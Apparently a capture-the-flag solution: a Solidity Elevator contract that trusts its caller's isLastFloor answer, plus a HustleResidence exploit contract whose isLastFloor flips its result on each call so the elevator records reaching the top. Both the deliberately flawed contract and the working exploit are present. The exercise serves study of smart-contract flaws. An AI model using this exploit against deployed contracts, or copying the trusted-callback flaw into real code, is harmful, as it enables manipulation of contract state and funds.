// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Building, Elevator } from "./Elevator.sol";

contract HustleResidence is Building {
    Elevator public elevator;
    bool public lastFloor;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
        lastFloor = true; // Init to true so the first flip would be false.
    }

    function isLastFloor(uint) external returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }

    function goToTheLastFloor() external {
        elevator.goTo(99);
    }
}